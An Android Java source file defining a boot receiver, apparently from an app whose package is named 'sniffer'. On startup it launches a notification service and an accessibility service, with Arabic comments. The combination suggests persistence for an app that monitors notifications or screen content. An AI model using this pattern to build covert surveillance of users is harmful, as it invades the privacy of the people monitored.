package com.v8.global.sniffer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            // بدء الخدمة الرئيسية
            Intent serviceIntent = new Intent(context, NotificationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            // بدء خدمة الوصول
            Intent accessibilityIntent = new Intent(context, MyAccessibilityService.class);
            context.startService(accessibilityIntent);
        }
    }
}
